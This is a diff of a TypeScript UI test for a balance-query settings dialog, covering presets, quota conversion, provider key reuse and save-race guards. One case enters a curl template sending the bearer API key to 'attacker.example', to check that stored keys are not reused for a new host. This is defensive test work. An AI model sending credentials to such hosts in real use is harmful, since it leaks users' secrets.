@@ -16,11 +16,14 @@ const root = document.querySelector<HTMLElement>('#root')!;
 const instance = { id: 'fixture-balance', name: 'Balance', enabled: true, created_at: '' };
 const defaultCurl = "curl https://api.deepseek.com/user/balance -H 'Authorization: Bearer {{API_KEY}}'";
 let savedCurl = defaultCurl;
+let savedNewApi = false;
+let savedQuotaPerUnit = 0;
+let savedQuotaSettings = { usdExchangeRate: 0, quotaDisplayType: '', customCurrencySymbol: '', customCurrencyExchangeRate: 0 };
 let savedKey = '';
 let savedProvider = '';
 let providers = [
-  { id: 'provider-a', displayName: 'Provider <A>', available: true },
-  { id: 'provider-b', displayName: 'Provider B', available: true },
+  { id: 'provider-a', displayName: 'Provider <A>', available: true, baseUrl: 'http://127.0.0.1:9000/v1' },
+  { id: 'provider-b', displayName: 'Provider B', available: true, baseUrl: 'http://127.0.0.1:9000/v1' },
   { id: 'no-key', displayName: 'No key', available: false },
 ];
 let failSave = false;
@@ -29,7 +32,12 @@ let releaseSave: (() => void) | undefined;
 let overviewLoads = 0;
 let deferGet = false;
 let releaseGet: (() => void) | undefined;
+let deferQuotaFetch = false;
+let releaseQuotaFetch: (() => void) | undefined;
 const saves: Record<string, unknown>[] = [];
+const tests: Record<string, unknown>[] = [];
+const quotaFetches: Record<string, unknown>[] = [];
+const fetchedQuotaSettings = { quotaPerUnit: 400000, usdExchangeRate: 7.2, quotaDisplayType: 'CUSTOM', customCurrencySymbol: '€', customCurrencyExchangeRate: 0.9 };
 const toolUpdates: Record<string, boolean> = {};
 globalThis.fetch = async (input, init) => {
   const path = new URL(input instanceof Request ? input.url : String(input), dom.window.location.origin).pathname;
@@ -48,14 +56,36 @@ globalThis.fetch = async (input, init) => {
   }
   if (path.endsWith('/GetBalanceQueryConfig')) {
     if (deferGet) await new Promise<void>((resolve) => { releaseGet = resolve; });
-    return Response.json({ curl: savedCurl, apiKeyConfigured: !!savedKey || !!savedProvider, providerId: savedProvider, providers });
+    return Response.json({ newapi: savedNewApi, quotaPerUnit: savedQuotaPerUnit, ...savedQuotaSettings, curl: savedCurl, apiKeyConfigured: !!savedKey || !!savedProvider, providerId: savedProvider, providers });
+  }
+  const body = await (input instanceof Request ? input : new Request(new URL(path, dom.window.location.origin), init)).json();
+  if (path.endsWith('/FetchQuotaConfig')) {
+    quotaFetches.push(body);
+    if (deferQuotaFetch) await new Promise<void>((resolve) => { releaseQuotaFetch = resolve; });
+    return Response.json({ ok: true, message: 'synthetic quota settings', ...fetchedQuotaSettings });
+  }
+  if (path.endsWith('/TestBalanceQueryConfig')) {
+    tests.push(body);
+    return Response.json({ ok: true, message: 'synthetic connection succeeded' });
   }
   assert.ok(path.endsWith('/SaveBalanceQueryConfig'), path);
-  const body = await (input instanceof Request ? input : new Request(new URL(path, dom.window.location.origin), init)).json();
   saves.push(body);
   if (deferSave) await new Promise<void>((resolve) => { releaseSave = resolve; });
   if (failSave) return Response.json({ code: 'invalid_argument', message: 'synthetic invalid curl' }, { status: 400 });
+  // Mirrors the backend rule: a blank key may only be reused when the request endpoint is unchanged.
+  const endpointOf = (curl: string) => curl.match(/https?:\/\/\S+/)?.[0] ?? '';
+  if (!body.apiKey && !body.clearApiKey && !body.providerId && savedKey && endpointOf(body.curl) !== endpointOf(savedCurl)) {
+    return Response.json({ code: 'invalid_argument', message: '请求地址已变更，请重新输入 Key，不会复用原有密钥' }, { status: 400 });
+  }
   savedCurl = body.curl;
+  savedNewApi = !!body.newapi;
+  savedQuotaPerUnit = body.quotaPerUnit || 0;
+  savedQuotaSettings = {
+    usdExchangeRate: body.usdExchangeRate || 0,
+    quotaDisplayType: body.quotaDisplayType || '',
+    customCurrencySymbol: body.customCurrencySymbol || '',
+    customCurrencyExchangeRate: body.customCurrencyExchangeRate || 0,
+  };
   if (body.clearApiKey) {
     savedKey = '';
     savedProvider = '';
@@ -63,7 +93,7 @@ globalThis.fetch = async (input, init) => {
     savedProvider = body.providerId || '';
     if (savedProvider) savedKey = ''; else if (body.apiKey) savedKey = body.apiKey;
   }
-  return Response.json({ curl: savedCurl, apiKeyConfigured: !!savedKey || !!savedProvider, providerId: savedProvider, providers });
+  return Response.json({ newapi: savedNewApi, quotaPerUnit: savedQuotaPerUnit, ...savedQuotaSettings, curl: savedCurl, apiKeyConfigured: !!savedKey || !!savedProvider, providerId: savedProvider, providers });
 };
 const flush = async () => { for (let i = 0; i < 8; i++) await setImmediate(); };
 const openConfig = async () => { root.querySelector<HTMLButtonElement>('[data-tool-config="balance_query"]')!.click(); await flush(); };
@@ -96,9 +126,6 @@ try {
   assert.match(document.querySelector('.fa-toast-error')?.textContent ?? '', /请先点击卡片后进行配置/);
   assert.equal(toolUpdates['balance_query'], undefined, 'forced balance_query enable must not reach the API');
   await openConfig();
-  const clearButton = document.querySelector<HTMLButtonElement>('#balance-query-clear-key')!;
-  assert.ok(clearButton, 'clear-key action must exist');
-  assert.equal(clearButton.disabled, true, 'clear-key action must be disabled without a stored key');
   assert.equal(document.querySelector<HTMLElement>('#balance-query-providers')!.hidden, true);
   assert.equal(document.querySelector<HTMLTextAreaElement>('#balance-query-curl')!.value, defaultCurl);
   let key = document.querySelector<HTMLInputElement>('#balance-query-key')!;
@@ -121,7 +148,6 @@ try {
   key = document.querySelector<HTMLInputElement>('#balance-query-key')!;
   assert.equal(key.value, '', 'stored key must never populate the frontend field');
   assert.match(key.placeholder, /留空保留/);
-  assert.equal(document.querySelector<HTMLButtonElement>('#balance-query-clear-key')!.disabled, false);
   assert.equal(document.querySelector<HTMLTextAreaElement>('#balance-query-curl')!.value, customCurl);
   await save();
   assert.equal(savedKey, 'synthetic-ui-balance-key');
@@ -130,7 +156,6 @@ try {
   const reuse = document.querySelector<HTMLInputElement>('#balance-query-reuse-key')!;
   reuse.click();
   assert.equal(document.querySelector<HTMLInputElement>('#balance-query-key')!.disabled, true);
-  assert.equal(document.querySelector<HTMLButtonElement>('#balance-query-clear-key')!.disabled, true);
   assert.equal(document.querySelector<HTMLElement>('#balance-query-manual-key')!.hidden, true);
   assert.equal(document.querySelector<HTMLElement>('#balance-query-providers')!.hidden, false);
   const savesBeforeSelection = saves.length;
@@ -179,6 +204,16 @@ try {
     assert.equal(dialog.querySelector<HTMLInputElement>('#balance-query-reuse-key')!.disabled, true);
     assert.ok([...dialog.querySelectorAll<HTMLInputElement>('input[name="balance-query-provider"]')].every((input) => input.disabled));
     assert.equal(dialog.querySelector<HTMLTextAreaElement>('#balance-query-curl')!.disabled, true);
+    // Every control whose value the pending save captured is locked, so edits cannot be silently dropped.
+    for (const id of ['#balance-query-use-endpoint', '#balance-query-quota-enabled', '#balance-query-quota-ratio', '#balance-query-usd-rate', '#balance-query-display-type', '#balance-query-fetch-quota', '#balance-query-custom-symbol', '#balance-query-custom-rate']) {
+      assert.equal(dialog.querySelector<HTMLInputElement | HTMLButtonElement>(id)!.disabled, true, `${id} must be locked while saving`);
+    }
+    const presetSelect = dialog.querySelector<HTMLSelectElement>('#balance-query-preset')!;
+    assert.equal(presetSelect.disabled, true, 'preset select must be disabled while a save is pending');
+    const pendingCurl = dialog.querySelector<HTMLTextAreaElement>('#balance-query-curl')!.value;
+    presetSelect.value = 'deepseek';
+    presetSelect.dispatchEvent(new dom.window.Event('change'));
+    assert.equal(dialog.querySelector<HTMLTextAreaElement>('#balance-query-curl')!.value, pendingCurl, 'pending save curl must not change');
     await save();
     assert.equal(saves.length, savesBefore + 1, 'pending save was submitted twice');
     for (const close of dialog.querySelectorAll<HTMLButtonElement>('.dialog-close-btn')) {
@@ -216,20 +251,8 @@ try {
     }
   }
   failSave = false;
-  await openConfig();
-  const clearButtonAfterSave = document.querySelector<HTMLButtonElement>('#balance-query-clear-key')!;
-  assert.equal(clearButtonAfterSave.disabled, false, 'clear-key action must be enabled for a stored key');
-  clearButtonAfterSave.click();
-  assert.equal(document.querySelector<HTMLInputElement>('#balance-query-key')!.value, '');
-  assert.match(document.querySelector('#balance-query-key-hint')!.textContent!, /清除/);
-  await save();
-  assert.equal(saves.at(-1)!.clearApiKey, true);
-  assert.equal(savedKey, '');
-  assert.equal(document.querySelectorAll('dialog').length, 0);
+  document.querySelector<HTMLButtonElement>('dialog .dialog-close-btn')?.click();
   await flush();
-  const clearedCard = [...root.querySelectorAll<HTMLElement>('.overview-tool-card')].find((card) => card.textContent?.includes('balance_query'))!;
-  assert.equal(clearedCard.querySelector('.overview-tool-unconfigured')?.textContent, '未配置');
-  assert.equal(clearedCard.querySelector<HTMLInputElement>('[data-tool-toggle="balance_query"]')!.checked, false);
   providers = [];
   savedProvider = 'deleted-provider';
   await openConfig();
@@ -240,6 +263,341 @@ try {
   assert.equal(saves.length, savesBeforeMissingProvider, 'missing provider must not silently fall back to a manual credential');
   document.querySelector<HTMLButtonElement>('dialog .dialog-close-btn')!.click();
   await flush();
+  {
+    // Earlier cases empty the provider list and set a deleted provider; restore a usable list for these cases.
+    providers = [
+      { id: 'provider-a', displayName: 'Provider <A>', available: true, baseUrl: 'https://newapi.example/v1' },
+      { id: 'provider-b', displayName: 'Provider B', available: true, baseUrl: 'https://newapi.example/v1' },
+    ];
+    savedProvider = '';
+    // Preset selection fills the curl template and the matching key placeholder.
+    await openConfig();
+    const presetDialog = document.querySelector<HTMLDialogElement>('dialog')!;
+    const preset = presetDialog.querySelector<HTMLSelectElement>('#balance-query-preset')!;
+    const presetCurl = presetDialog.querySelector<HTMLTextAreaElement>('#balance-query-curl')!;
+    const presetKey = presetDialog.querySelector<HTMLInputElement>('#balance-query-key')!;
+    const presetHint = presetDialog.querySelector<HTMLElement>('#balance-query-preset-hint')!;
+    const choose = (value: string) => { preset.value = value; preset.dispatchEvent(new dom.window.Event('change')); };
+    assert.deepEqual([...preset.options].map((option) => option.value), ['', 'deepseek', 'newapi-key', 'newapi-account']);
+    choose('newapi-key');
+    assert.match(presetCurl.value, /\/api\/usage\/token\/\s*\\/);
+    assert.match(presetCurl.value, /\{\{API_KEY\}\}/);
+    assert.equal(presetKey.placeholder, 'sk-xxx');
+    assert.match(presetHint.textContent!, /unlimited_quota/);
+    choose('newapi-account');
+    assert.match(presetCurl.value, /\/api\/user\/self\s*\\/);
+    assert.equal(presetKey.placeholder, 'nap_xxx');
+    assert.match(presetHint.textContent!, /profile:read/);
+    choose('');
+    assert.equal(presetHint.hidden, true, 'custom option must hide the preset hint');
+    const testButton = presetDialog.querySelector<HTMLButtonElement>('#balance-query-test')!;
+    const cancelButton = [...presetDialog.querySelectorAll<HTMLButtonElement>('.dialog-close-btn')].find((button) => button.textContent!.trim() === '取消')!;
+    assert.equal(testButton.textContent!.trim(), '测试连接');
+    const clearButton = presetDialog.querySelector<HTMLButtonElement>('#balance-query-clear-config')!;
+    assert.ok(clearButton.textContent!.includes('清除配置'), 'clear button must be labelled 清除配置');
+    assert.ok(clearButton.compareDocumentPosition(testButton) & dom.window.Node.DOCUMENT_POSITION_FOLLOWING, '清除配置 must be the left-most footer action');
+    assert.ok(testButton.compareDocumentPosition(cancelButton) & dom.window.Node.DOCUMENT_POSITION_FOLLOWING, '测试连接 must sit to the left of 取消');
+    choose('newapi-key');
+    presetCurl.value = "curl https://hand.example/balance -H 'Authorization: Bearer {{API_KEY}}'";
+    presetCurl.dispatchEvent(new dom.window.Event('input'));
+    assert.equal(preset.value, '', 'hand-editing the template must return the selector to 自定义');
+    assert.equal(presetHint.hidden, true);
+
+    // New API endpoint reuse: the option appears only for New API presets; enabling it hides the curl box,
+    // forces the provider key, and builds the request from the provider's scheme and host (path removed).
+    const endpointRowEl = presetDialog.querySelector<HTMLElement>('#balance-query-endpoint-row')!;
+    const useEndpointEl = presetDialog.querySelector<HTMLInputElement>('#balance-query-use-endpoint')!;
+    const reuseKeyEl = presetDialog.querySelector<HTMLInputElement>('#balance-query-reuse-key')!;
+    choose('newapi-key');
+    assert.equal(endpointRowEl.hidden, false);
+    choose('deepseek');
+    assert.equal(endpointRowEl.hidden, true, 'endpoint reuse is only offered for New API presets');
+    // Quota conversion: only for New API presets, default ratio 500000, sent with the save request.
+    const quotaBoxEl = presetDialog.querySelector<HTMLElement>('#balance-query-quota')!;
+    const quotaEnabledEl = presetDialog.querySelector<HTMLInputElement>('#balance-query-quota-enabled')!;
+    const quotaRatioEl = presetDialog.querySelector<HTMLInputElement>('#balance-query-quota-ratio')!;
+    choose('deepseek');
+    assert.equal(quotaBoxEl.hidden, true, 'quota conversion is only offered for New API presets');
+    choose('newapi-key');
+    assert.equal(quotaBoxEl.hidden, false);
+    assert.equal(quotaRatioEl.value, '500000', 'default quota ratio is 500000');
+    quotaEnabledEl.checked = true;
+    quotaEnabledEl.dispatchEvent(new dom.window.Event('change'));
+    assert.equal(quotaRatioEl.closest<HTMLElement>('#balance-query-quota-ratio-row')!.hidden, false, 'ratio input shows when enabled');
+    quotaEnabledEl.checked = false;
+    quotaEnabledEl.dispatchEvent(new dom.window.Event('change'));
+    choose('newapi-key');
+    useEndpointEl.checked = true;
+    useEndpointEl.dispatchEvent(new dom.window.Event('change'));
+    assert.equal(presetCurl.hidden, true, 'enabling endpoint reuse hides the curl box');
+    // Endpoint reuse only replaces the address; the key choice stays with the user (a PAT is not a provider key).
+    assert.equal(reuseKeyEl.disabled, false, 'endpoint reuse must not lock the key-reuse choice');
+    presetDialog.querySelector<HTMLInputElement>('input[value="provider-a"]')!.click();
+    assert.equal(presetCurl.value, "curl https://newapi.example/api/usage/token/ \\\n  -H 'Authorization: Bearer {{API_KEY}}'");
+    useEndpointEl.checked = false;
+    useEndpointEl.dispatchEvent(new dom.window.Event('change'));
+    assert.equal(presetCurl.hidden, false, 'disabling endpoint reuse shows the curl box again');
+    assert.equal(reuseKeyEl.disabled, false);
+    // Switching between the sk- token and nap_ PAT presets withdraws provider reuse, even on the same origin.
+    choose('newapi-key');
+    reuseKeyEl.checked = true;
+    reuseKeyEl.dispatchEvent(new dom.window.Event('change'));
+    presetDialog.querySelector<HTMLInputElement>('input[value="provider-a"]')!.click();
+    assert.equal(reuseKeyEl.checked, true, 'precondition: provider reuse must be active before switching');
+    assert.equal(presetDialog.querySelectorAll('input[name="balance-query-provider"]:checked').length, 1, 'precondition: a provider must be selected');
+    choose('newapi-account');
+    assert.equal(reuseKeyEl.checked, false, 'switching credential type must withdraw key reuse');
+    assert.equal(presetDialog.querySelectorAll('input[name="balance-query-provider"]:checked').length, 0, 'switching credential type must clear the provider selection');
+    presetDialog.querySelector<HTMLButtonElement>('.dialog-close-btn')!.click();
+    await flush();
+
+    // Switching a stored manual key to another host must not silently reuse the old secret.
+    savedProvider = '';
+    savedKey = 'synthetic-stored-deepseek-key';
+    await openConfig();
+    const hostDialog = document.querySelector<HTMLDialogElement>('dialog')!;
+    const hostPreset = hostDialog.querySelector<HTMLSelectElement>('#balance-query-preset')!;
+    const hostKey = hostDialog.querySelector<HTMLInputElement>('#balance-query-key')!;
+    const hostError = hostDialog.querySelector<HTMLElement>('#balance-query-error')!;
+    hostPreset.value = 'newapi-key';
+    hostPreset.dispatchEvent(new dom.window.Event('change'));
+    assert.equal(hostKey.required, true, 'preset change with a stored key must require re-entry');
+    const savesBeforeHostSwitch = saves.length;
+    hostDialog.querySelector<HTMLFormElement>('#balance-query-form')!.dispatchEvent(new dom.window.Event('submit', { cancelable: true }));
+    await flush();
+    assert.equal(saves.length, savesBeforeHostSwitch, 'stored key must not be reused for a new host');
+    assert.match(hostError.textContent!, /请重新输入/);
+    hostKey.value = 'sk-synthetic-new-host-key';
+    hostDialog.querySelector<HTMLFormElement>('#balance-query-form')!.dispatchEvent(new dom.window.Event('submit', { cancelable: true }));
+    await flush();
+    assert.equal(saves.length, savesBeforeHostSwitch + 1);
+    assert.equal(saves.at(-1)!.apiKey, 'sk-synthetic-new-host-key');
+
+    // Editing the curl host by hand (no preset) is the same destination change and must also block reuse.
+    await openConfig();
+    const editDialog = document.querySelector<HTMLDialogElement>('dialog')!;
+    const editCurl = editDialog.querySelector<HTMLTextAreaElement>('#balance-query-curl')!;
+    const editError = editDialog.querySelector<HTMLElement>('#balance-query-error')!;
+    const savesBeforeManualHost = saves.length;
+    editCurl.value = "curl https://attacker.example/api/user/self \\\n  -H 'Authorization: Bearer {{API_KEY}}'";
+    editCurl.dispatchEvent(new dom.window.Event('input'));
+    editDialog.querySelector<HTMLFormElement>('#balance-query-form')!.dispatchEvent(new dom.window.Event('submit', { cancelable: true }));
+    await flush();
+    // Custom template: a blank key is sent, and the backend refuses to reuse the stored key for a new host.
+    assert.equal(saves.length, savesBeforeManualHost + 1);
+    assert.ok(!saves.at(-1)!.apiKey, 'blank custom key is allowed in the form');
+    assert.match(editError.textContent!, /请重新输入/);
+    assert.equal(savedKey, 'sk-synthetic-new-host-key', 'refused edit must not change the stored key');
+    // A path-only change on a different endpoint is refused the same way.
+    editCurl.value = "curl https://你的NewAPI地址/api/user/self \\\n  -H 'Authorization: Bearer {{API_KEY}}'";
+    editCurl.dispatchEvent(new dom.window.Event('input'));
+    editDialog.querySelector<HTMLFormElement>('#balance-query-form')!.dispatchEvent(new dom.window.Event('submit', { cancelable: true }));
+    await flush();
+    assert.match(editError.textContent!, /请重新输入/);
+    editDialog.querySelector<HTMLInputElement>('#balance-query-key')!.value = 'sk-synthetic-path-key';
+    editDialog.querySelector<HTMLFormElement>('#balance-query-form')!.dispatchEvent(new dom.window.Event('submit', { cancelable: true }));
+    await flush();
+    assert.equal(saves.at(-1)!.apiKey, 'sk-synthetic-path-key');
+    savedKey = '';
+  }
+
+  {
+    // The enabled quota ratio is sent with the save request; disabling it sends 0.
+    await openConfig();
+    const quotaDialog = document.querySelector<HTMLDialogElement>('dialog')!;
+    const quotaPreset = quotaDialog.querySelector<HTMLSelectElement>('#balance-query-preset')!;
+    quotaPreset.value = 'newapi-key';
+    quotaPreset.dispatchEvent(new dom.window.Event('change'));
+    quotaDialog.querySelector<HTMLInputElement>('#balance-query-quota-enabled')!.checked = true;
+    quotaDialog.querySelector<HTMLInputElement>('#balance-query-quota-enabled')!.dispatchEvent(new dom.window.Event('change'));
+    quotaDialog.querySelector<HTMLInputElement>('#balance-query-quota-ratio')!.value = '500000';
+    quotaDialog.querySelector<HTMLInputElement>('#balance-query-key')!.value = 'sk-synthetic-quota-key';
+    const quotaBefore = saves.length;
+    quotaDialog.querySelector<HTMLFormElement>('#balance-query-form')!.dispatchEvent(new dom.window.Event('submit', { cancelable: true }));
+    await flush();
+    assert.equal(saves.length, quotaBefore + 1);
+    assert.equal(saves.at(-1)!.quotaPerUnit, 500000, 'enabled quota ratio must be sent with the save');
+    // Reopening keeps the New API mode: the quota fields stay visible with the saved ratio, and a resave keeps newapi.
+    document.querySelector<HTMLButtonElement>('dialog .dialog-close-btn')?.click();
+    await flush();
+    await openConfig();
+    const reopened = document.querySelector<HTMLDialogElement>('dialog')!;
+    assert.equal(reopened.querySelector<HTMLElement>('#balance-query-quota')!.hidden, false, 'saved New API template must reopen with quota fields');
+    assert.equal(reopened.querySelector<HTMLInputElement>('#balance-query-quota-ratio')!.value, '500000');
+    reopened.querySelector<HTMLFormElement>('#balance-query-form')!.dispatchEvent(new dom.window.Event('submit', { cancelable: true }));
+    await flush();
+    assert.equal(saves.at(-1)!.newapi, true, 'resaving a reopened New API template must keep newapi');
+    assert.equal(saves.at(-1)!.quotaPerUnit, 500000, 'resaving must keep the quota ratio');
+    savedKey = '';
+    await openConfig();
+    const offDialog = document.querySelector<HTMLDialogElement>('dialog')!;
+    const offPreset = offDialog.querySelector<HTMLSelectElement>('#balance-query-preset')!;
+    offPreset.value = 'newapi-account';
+    offPreset.dispatchEvent(new dom.window.Event('change'));
+    offDialog.querySelector<HTMLInputElement>('#balance-query-quota-enabled')!.checked = false;
+    offDialog.querySelector<HTMLInputElement>('#balance-query-key')!.value = 'nap_synthetic_quota_key';
+    const offBefore = saves.length;
+    offDialog.querySelector<HTMLFormElement>('#balance-query-form')!.dispatchEvent(new dom.window.Event('submit', { cancelable: true }));
+    await flush();
+    assert.equal(saves.at(-1)!.quotaPerUnit ?? 0, 0, 'disabled quota conversion sends 0');
+    assert.equal(saves.length, offBefore + 1);
+    savedKey = '';
+  }
+
+  {
+    // A reopened config has a custom selector, but its request still has a credential contract.
+    const newApiCurl = (path: string) => `curl https://newapi.example${path} -H 'Authorization: Bearer {{API_KEY}}'`;
+    const tokenCurl = newApiCurl('/api/usage/token/');
+    const accountCurl = newApiCurl('/api/user/self');
+    providers = [{ id: 'provider-a', displayName: 'Provider A', available: true, baseUrl: 'https://newapi.example/v1' }];
+    const providerSnapshot = structuredClone(providers);
+    for (const scenario of [
+      { name: 'token to account in one paste', initial: tokenCurl, edits: [accountCurl], withdraw: true },
+      { name: 'account to token in one paste', initial: accountCurl, edits: [tokenCurl], withdraw: true },
+      { name: 'contract retained while typing a path', initial: tokenCurl, edits: [newApiCurl('/api/user/'), accountCurl], withdraw: true },
+      { name: 'ordinary same-origin paths', initial: newApiCurl('/balance'), edits: [newApiCurl('/usage')], withdraw: false },
+      { name: 'same contract with another query', initial: tokenCurl, edits: [newApiCurl('/api/usage/token/?detail=1')], withdraw: false },
+      { name: 'unknown custom path to account contract', initial: newApiCurl('/custom'), edits: [accountCurl], withdraw: true },
+      { name: 'unknown custom path to token contract', initial: newApiCurl('/custom'), edits: [tokenCurl], withdraw: true },
+      { name: 'unknown custom path to unknown path', initial: newApiCurl('/custom'), edits: [newApiCurl('/other')], withdraw: false },
+      { name: 'header URL does not conceal a changed origin', initial: tokenCurl, edits: ["curl -H 'Referer: https://newapi.example/api/usage/token/' --url 'https://other.example/api/usage/token/' -H 'Authorization: Bearer {{API_KEY}}'"], withdraw: true },
+      { name: 'header URL does not change the actual origin or contract', initial: tokenCurl, edits: ["curl -H 'Referer: https://other.example/api/user/self' --url 'https://newapi.example/api/usage/token/' -H 'Authorization: Bearer {{API_KEY}}'"], withdraw: false },
+    ]) {
+      savedCurl = scenario.initial;
+      savedProvider = 'provider-a';
+      savedKey = '';
+      savedNewApi = true;
+      await openConfig();
+      const dialog = document.querySelector<HTMLDialogElement>('dialog')!;
+      const reuse = dialog.querySelector<HTMLInputElement>('#balance-query-reuse-key')!;
+      const curl = dialog.querySelector<HTMLTextAreaElement>('#balance-query-curl')!;
+      const key = dialog.querySelector<HTMLInputElement>('#balance-query-key')!;
+      assert.equal(dialog.querySelector<HTMLSelectElement>('#balance-query-preset')!.value, '', `${scenario.name}: reopened selector is custom`);
+      assert.equal(reuse.checked, true, `${scenario.name}: a matching saved provider stays selected on open`);
+      assert.equal(dialog.querySelector<HTMLInputElement>('input[value="provider-a"]')!.checked, true);
+      key.value = 'synthetic-unsaved-manual-key';
+      for (const edit of scenario.edits) {
+        curl.value = edit;
+        curl.dispatchEvent(new dom.window.Event('input'));
+      }
+      assert.equal(reuse.checked, !scenario.withdraw, scenario.name);
+      assert.equal(dialog.querySelectorAll('input[name="balance-query-provider"]:checked').length, scenario.withdraw ? 0 : 1, `${scenario.name}: provider selection`);
+      assert.equal(key.value, scenario.withdraw ? '' : 'synthetic-unsaved-manual-key', `${scenario.name}: manual draft`);
+      if (scenario.withdraw) {
+        assert.equal(dialog.querySelector<HTMLInputElement>('#balance-query-use-endpoint')!.checked, false);
+        assert.equal(dialog.querySelector<HTMLElement>('#balance-query-manual-key')!.hidden, false);
+        assert.equal(key.disabled, false);
+        const before = saves.length;
+        await save();
+        assert.equal(saves.length, before, `${scenario.name}: withdrawal requires an explicit credential choice`);
+      }
+      assert.deepEqual(providers, providerSnapshot, 'withdrawing balance-query reuse must not modify the provider configuration');
+      assert.equal(savedProvider, 'provider-a', 'editing alone must not change the persisted provider reference');
+      dialog.querySelector<HTMLButtonElement>('.dialog-close-btn')!.click();
+      await flush();
+    }
+
+    // A custom selector must not turn a restored account request into a token request when reusing an endpoint.
+    savedCurl = accountCurl;
+    savedProvider = 'provider-a';
+    await openConfig();
+    const accountDialog = document.querySelector<HTMLDialogElement>('dialog')!;
+    accountDialog.querySelector<HTMLInputElement>('#balance-query-use-endpoint')!.click();
+    assert.match(accountDialog.querySelector<HTMLTextAreaElement>('#balance-query-curl')!.value, /https:\/\/newapi\.example\/api\/user\/self\s/);
+    assert.equal(accountDialog.querySelector<HTMLInputElement>('#balance-query-reuse-key')!.checked, true);
+    assert.equal(accountDialog.querySelector<HTMLInputElement>('input[value="provider-a"]')!.checked, true);
+    await save();
+    assert.match(String(saves.at(-1)!.curl), /\/api\/user\/self\s/);
+    assert.equal(saves.at(-1)!.providerId, 'provider-a');
+
+    // A provider may be changed elsewhere after saving, before this dialog is reopened.
+    savedCurl = tokenCurl;
+    savedProvider = 'provider-a';
+    providers[0].baseUrl = 'https://moved.example/v1';
+    await openConfig();
+    const staleDialog = document.querySelector<HTMLDialogElement>('dialog')!;
+    assert.equal(staleDialog.querySelector<HTMLInputElement>('#balance-query-reuse-key')!.checked, false, 'a stale saved provider origin must be withdrawn immediately on open');
+    assert.equal(staleDialog.querySelectorAll('input[name="balance-query-provider"]:checked').length, 0);
+    assert.equal(staleDialog.querySelector<HTMLInputElement>('#balance-query-key')!.value, '');
+    assert.equal(staleDialog.querySelector<HTMLElement>('#balance-query-manual-key')!.hidden, false);
+    const savesBeforeStale = saves.length;
+    await save();
+    assert.equal(saves.length, savesBeforeStale, 'a stale provider must not be saved without choosing new credentials');
+    assert.equal(providers[0].baseUrl, 'https://moved.example/v1', 'withdrawing the reference must leave the provider itself intact');
+    staleDialog.querySelector<HTMLButtonElement>('.dialog-close-btn')!.click();
+    await flush();
+  }
+
+  {
+    // Fetch must replace stale CUSTOM settings and carry the exact values through Test, Save and reopen.
+    savedCurl = "curl https://newapi.example/api/usage/token/ -H 'Authorization: Bearer {{API_KEY}}'";
+    savedProvider = '';
+    savedKey = 'sk-synthetic-custom-currency-key';
+    savedNewApi = true;
+    savedQuotaPerUnit = 200000;
+    savedQuotaSettings = { usdExchangeRate: 6.8, quotaDisplayType: 'CUSTOM', customCurrencySymbol: '£', customCurrencyExchangeRate: 1.5 };
+    await openConfig();
+    const dialog = document.querySelector<HTMLDialogElement>('dialog')!;
+    const symbol = dialog.querySelector<HTMLInputElement>('#balance-query-custom-symbol')!;
+    const rate = dialog.querySelector<HTMLInputElement>('#balance-query-custom-rate')!;
+    assert.equal(symbol.value, '£');
+    assert.equal(rate.value, '1.5');
+    const fetchesBefore = quotaFetches.length;
+    const savesBefore = saves.length;
+    dialog.querySelector<HTMLButtonElement>('#balance-query-fetch-quota')!.click();
+    await flush();
+    assert.equal(quotaFetches.length, fetchesBefore + 1);
+    assert.equal(quotaFetches.at(-1)!.curl, savedCurl);
+    assert.equal(symbol.value, '€', 'fetch must populate the remote CUSTOM symbol');
+    assert.equal(rate.value, '0.9', 'fetch must populate the remote CUSTOM exchange rate');
+    assert.equal(dialog.querySelector<HTMLInputElement>('#balance-query-display-type')!.value, 'CUSTOM');
+    const testsBefore = tests.length;
+    dialog.querySelector<HTMLButtonElement>('#balance-query-test')!.click();
+    await flush();
+    assert.equal(tests.length, testsBefore + 1);
+    for (const [field, value] of Object.entries(fetchedQuotaSettings)) {
+      assert.equal(tests.at(-1)![field], value, `Test must send the fetched ${field}`);
+    }
+    assert.equal(saves.length, savesBefore, 'fetching or testing settings must not save the draft');
+    await save();
+    assert.equal(saves.length, savesBefore + 1);
+    for (const [field, value] of Object.entries(fetchedQuotaSettings)) {
+      assert.equal(saves.at(-1)![field], value, `Save must send the fetched ${field}`);
+    }
+    await openConfig();
+    const reopened = document.querySelector<HTMLDialogElement>('dialog')!;
+    assert.equal(reopened.querySelector<HTMLInputElement>('#balance-query-custom-symbol')!.value, '€');
+    assert.equal(reopened.querySelector<HTMLInputElement>('#balance-query-custom-rate')!.value, '0.9');
+    reopened.querySelector<HTMLButtonElement>('.dialog-close-btn')!.click();
+    await flush();
+
+    // A late /api/status response must not overwrite settings after the request target changes.
+    await openConfig();
+    const delayedDialog = document.querySelector<HTMLDialogElement>('dialog')!;
+    const delayedCurl = delayedDialog.querySelector<HTMLTextAreaElement>('#balance-query-curl')!;
+    const delayedSymbol = delayedDialog.querySelector<HTMLInputElement>('#balance-query-custom-symbol')!;
+    const delayedRate = delayedDialog.querySelector<HTMLInputElement>('#balance-query-custom-rate')!;
+    const delayedError = delayedDialog.querySelector<HTMLElement>('#balance-query-error')!;
+    delayedSymbol.value = '¥';
+    delayedRate.value = '2';
+    deferQuotaFetch = true;
+    delayedDialog.querySelector<HTMLButtonElement>('#balance-query-fetch-quota')!.click();
+    await flush();
+    assert.equal(quotaFetches.at(-1)!.curl, savedCurl);
+    assert.equal(delayedDialog.querySelector<HTMLButtonElement>('#balance-query-save')!.disabled, true, 'Save must be disabled while fetching status');
+    delayedCurl.value = "curl https://other-newapi.example/api/usage/token/ -H 'Authorization: Bearer {{API_KEY}}'";
+    delayedCurl.dispatchEvent(new dom.window.Event('input'));
+    deferQuotaFetch = false;
+    releaseQuotaFetch?.();
+    await flush();
+    assert.equal(delayedSymbol.value, '¥', 'late response must not overwrite the symbol');
+    assert.equal(delayedRate.value, '2', 'late response must not overwrite the custom rate');
+    assert.match(delayedError.textContent!, /请求模板已变化/);
+    assert.equal(delayedDialog.querySelector<HTMLButtonElement>('#balance-query-save')!.disabled, false, 'Save must be restored after fetch completes');
+    delayedDialog.querySelector<HTMLButtonElement>('.dialog-close-btn')!.click();
+    await flush();
+  }
+
   deferGet = true;
   await openConfig();
   cleanup();
@@ -252,4 +610,4 @@ try {
   dom.window.close();
   Object.assign(globalThis, originals);
 }
-console.log('PASS: balance query defaults, unavailable toggle, clear-key, provider reuse, credentials, pending-save dismissal, failure retry and instance lifecycle');
+console.log('PASS: balance query defaults, unavailable toggle, provider reuse, credentials, pending-save dismissal, preset selection, failure retry and instance lifecycle');
